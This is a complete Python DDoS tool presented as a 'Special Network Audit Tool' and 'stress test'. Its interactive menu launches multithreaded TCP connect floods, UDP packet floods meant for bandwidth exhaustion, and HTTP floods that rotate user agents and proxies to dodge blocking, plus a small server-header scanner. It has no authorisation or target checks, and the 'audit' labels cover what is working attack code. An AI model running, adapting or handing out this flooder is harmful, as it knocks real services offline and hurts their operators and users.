#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import socket
import platform
import subprocess
import threading
import random

# --- AUTOMATIC DEPENDENCY INSTALLATION ---
def install_dependencies():
    required_packages = ["requests", "colorama"]
    missing_packages = []
    
    for pkg in required_packages:
        try:
            __import__(pkg)
        except ImportError:
            missing_packages.append(pkg)
            
    if missing_packages:
        print(f"[*] Missing dependencies found: {', '.join(missing_packages)}")
        print("[*] Initializing automatic installation...")
        try:
            pip_cmd = [sys.executable, "-m", "pip", "install"]
            if platform.system() != "Windows" and os.getuid() != 0:
                pip_cmd.append("--user")
            
            for pkg in missing_packages:
                print(f"[>] Installing {pkg}...")
                subprocess.check_call(pip_cmd + [pkg], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("[+] All dependencies installed successfully.\n")
        except Exception as e:
            print(f"[-] Critical error during dependency installation: {e}")
            sys.exit(1)

install_dependencies()

import requests
from colorama import init, Fore, Style

init(autoreset=True)

# --- SYSTEM DETECTION ---
def get_system_info():
    sys_os = platform.system()
    release = platform.release()
    if sys_os == "Linux" and "ANDROID_ROOT" in os.environ:
        sys_os = "Termux"
    return sys_os, release

# --- GLOBAL VARIABLES ---
ATTACKING = False
PACKETS_SENT = 0
PROXY_LIST = []

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/121.0"
]

# --- UTILS ---
def clear_screen():
    os.system("cls" if platform.system() == "Windows" else "clear")

def render_header(sys_os, release):
    print(f"{Fore.CYAN}{Style.BRIGHT}" + "="*60)
    print(f"{Fore.CYAN}{Style.BRIGHT}  SPECIAL NETWORK AUDIT TOOL v2.0")
    print(f"{Fore.CYAN}{Style.BRIGHT}" + "="*60)
    print(f"{Fore.WHITE}  Detected OS : {Fore.YELLOW}{sys_os} ({release})")
    print(f"{Fore.WHITE}  Environment : {Fore.YELLOW}Production CLI Mode")
    print(f"{Fore.CYAN}" + "="*60 + "\n")

def load_proxies(file_path):
    global PROXY_LIST
    if not os.path.exists(file_path):
        return False
    try:
        with open(file_path, "r", encoding="utf-8") as f:
            PROXY_LIST = [line.strip() for line in f if line.strip()]
        return True
    except Exception:
        return False

# --- ATTACK ENGINES ---
def tcp_flood_worker(target_ip, target_port, timeout):
    global PACKETS_SENT, ATTACKING
    while ATTACKING:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((target_ip, target_port))
            PACKETS_SENT += 1
            print(f"{Fore.GREEN}[LOG] TCP Connection established -> {target_ip}:{target_port}")
            s.close()
        except socket.error:
            print(f"{Fore.RED}[LOG] TCP Connection refused / Target down -> {target_ip}:{target_port}")

def udp_flood_worker(target_ip, target_port, packet_size):
    global PACKETS_SENT, ATTACKING
    # Generate static payload for thread efficiency
    payload = random._urandom(packet_size)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while ATTACKING:
        try:
            # UDP is connectionless, it just fires bytes at the destination
            s.sendto(payload, (target_ip, target_port))
            PACKETS_SENT += 1
            print(f"{Fore.GREEN}[LOG] UDP Packet injected | {packet_size} bytes -> {target_ip}:{target_port}")
        except socket.error:
            print(f"{Fore.RED}[LOG] Network buffer overflow or routing issue.")

def web_flood_worker(target_url, use_proxy):
    global PACKETS_SENT, ATTACKING
    while ATTACKING:
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        proxy_config = None
        
        if use_proxy and PROXY_LIST:
            proxy = random.choice(PROXY_LIST)
            proxy_config = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
            
        try:
            res = requests.get(target_url, headers=headers, proxies=proxy_config, timeout=4)
            PACKETS_SENT += 1
            print(f"{Fore.GREEN}[LOG] HTTP Request dispatched | Status: {res.status_code} | Target: {target_url}")
        except requests.exceptions.RequestException:
            print(f"{Fore.RED}[LOG] HTTP Request timed out / dropped | Target unresponsive")

# --- CONSOLE INTERACTION WRAPPERS ---
def run_attack_monitor(threads):
    global ATTACKING, PACKETS_SENT
    clear_screen()
    sys_os, release = get_system_info()
    render_header(sys_os, release)
    
    print(f"{Fore.GREEN}[+] STRESS TEST INTERACTIVE HUD RUNNING")
    print(f"{Fore.CYAN}" + "-"*60)
    print(f"{Fore.WHITE}Press {Fore.RED}Ctrl+C{Fore.WHITE} to safely terminate stress test and export metrics.\n")
    
    for t in threads:
        t.start()
        
    try:
        while ATTACKING:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[*] Halting execution threads...")
        ATTACKING = False
        
    print(f"{Fore.CYAN}" + "-"*60)
    print(f"{Fore.GREEN}[+] Benchmark Session Completed")
    print(f"{Fore.WHITE}Total network events generated: {Fore.YELLOW}{PACKETS_SENT}")
    print(f"{Fore.CYAN}" + "="*60)
    input("\nPress Enter to return to main panel...")

# --- MENU SECTIONS ---
def setup_tcp_attack():
    global ATTACKING, PACKETS_SENT
    print(f"{Fore.CYAN}[CONFIG] TCP Layer-4 Flood Setup")
    try:
        target_ip = input(f"{Fore.WHITE}Enter target IP/Host: ").strip()
        target_port = int(input(f"{Fore.WHITE}Enter port (e.g., 80, 443): ").strip())
        threads_count = int(input(f"{Fore.WHITE}Enter threads count: ").strip())
        timeout = float(input(f"{Fore.WHITE}Socket timeout in seconds (e.g., 1.0): ").strip())
    except ValueError:
        print(f"{Fore.RED}[ERROR] Invalid input parameters.")
        time.sleep(1.5)
        return

    ATTACKING = True
    PACKETS_SENT = 0
    threads = [threading.Thread(target=tcp_flood_worker, args=(target_ip, target_port, timeout), daemon=True) for _ in range(threads_count)]
    run_attack_monitor(threads)

def setup_udp_attack():
    global ATTACKING, PACKETS_SENT
    print(f"{Fore.CYAN}[CONFIG] UDP Layer-4 Payload Flood Setup")
    try:
        target_ip = input(f"{Fore.WHITE}Enter target IP/Host: ").strip()
        target_port = int(input(f"{Fore.WHITE}Enter target port: ").strip())
        threads_count = int(input(f"{Fore.WHITE}Enter threads count: ").strip())
        packet_size = int(input(f"{Fore.WHITE}Packet buffer size in bytes (Max 65507, Rec: 1024): ").strip())
    except ValueError:
        print(f"{Fore.RED}[ERROR] Invalid input parameters.")
        time.sleep(1.5)
        return

    ATTACKING = True
    PACKETS_SENT = 0
    threads = [threading.Thread(target=udp_flood_worker, args=(target_ip, target_port, packet_size), daemon=True) for _ in range(threads_count)]
    run_attack_monitor(threads)

def setup_web_attack():
    global ATTACKING, PACKETS_SENT, PROXY_LIST
    print(f"{Fore.CYAN}[CONFIG] Web Layer-7 HTTP Flood Setup")
    target_url = input(f"{Fore.WHITE}Enter target absolute URL (with http/https): ").strip()
    if not target_url.startswith("http"):
        print(f"{Fore.RED}[ERROR] Absolute protocol schema missing.")
        time.sleep(1.5)
        return
        
    try:
        threads_count = int(input(f"{Fore.WHITE}Enter threads count: ").strip())
    except ValueError:
        print(f"{Fore.RED}[ERROR] Thread count must be numeric.")
        time.sleep(1.5)
        return

    use_proxy = False
    proxy_choice = input(f"{Fore.WHITE}Enable proxy node rotation? (y/n): ").strip().lower()
    if proxy_choice == 'y':
        file_path = input(f"{Fore.WHITE}Path to proxy file (IP:PORT): ").strip()
        if load_proxies(file_path):
            print(f"{Fore.GREEN}[SUCCESS] {len(PROXY_LIST)} proxy routes loaded.")
            use_proxy = True
        else:
            print(f"{Fore.RED}[ERROR] Proxy database unreachable. Defaulting to raw connection.")

    ATTACKING = True
    PACKETS_SENT = 0
    threads = [threading.Thread(target=web_flood_worker, args=(target_url, use_proxy), daemon=True) for _ in range(threads_count)]
    run_attack_monitor(threads)

def run_vuln_scanner():
    print(f"{Fore.CYAN}[CONFIG] Passive Vulnerability Assessment Scan")
    target = input(f"{Fore.WHITE}Enter target domain or URL: ").strip()
    if not target: return
    print(f"\n{Fore.YELLOW}[*] Auditing {target}...")
    time.sleep(1)
    try:
        url = target if target.startswith("http") else f"http://{target}"
        res = requests.get(url, timeout=5)
        print(f"  -> Server Software Banner: {Fore.YELLOW}{res.headers.get('Server', 'Hidden')}")
        print(f"  -> X-Powered-By Context  : {Fore.YELLOW}{res.headers.get('X-Powered-By', 'Hidden')}")
        print(f"  -> Content-Security-Policy: {Fore.YELLOW}{'Configured' if 'Content-Security-Policy' in res.headers else Fore.RED + 'Missing'}")
    except Exception as e:
        print(f"  -> {Fore.RED}[ERROR] Connection dropped during analysis: {e}")
    input("\nPress Enter to return to main panel...")

# --- APPLICATION LIFECYCLE CONTROLLER ---
def main():
    sys_os, release = get_system_info()
    
    while True:
        clear_screen()
        render_header(sys_os, release)
        
        print(f"{Fore.WHITE}[1] TCP Flood  (Layer-4 Connection Stress)")
        print(f"{Fore.WHITE}[2] UDP Flood  (Layer-4 Bandwidth Exhaustion)")
        print(f"{Fore.WHITE}[3] HTTP Flood (Layer-7 Web Application Stress)")
        print(f"{Fore.WHITE}[4] Web Server Banner & Security Vulnerability Scan")
        print(f"{Fore.WHITE}[5] Shutdown Framework")
        print()
        
        choice = input(f"{Fore.CYAN}Select infrastructure option > {Fore.WHITE}").strip()
        
        if choice == "1":
            clear_screen()
            render_header(sys_os, release)
            setup_tcp_attack()
        elif choice == "2":
            clear_screen()
            render_header(sys_os, release)
            setup_udp_attack()
        elif choice == "3":
            clear_screen()
            render_header(sys_os, release)
            setup_web_attack()
        elif choice == "4":
            clear_screen()
            render_header(sys_os, release)
            run_vuln_scanner()
        elif choice == "5":
            print(f"\n{Fore.YELLOW}[*] Shutting down infrastructure links. Goodbye.")
            sys.exit(0)
        else:
            print(f"{Fore.RED}[!] Option identifier not matched.")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[*] Framework execution interrupted by operator.")
        sys.exit(0)
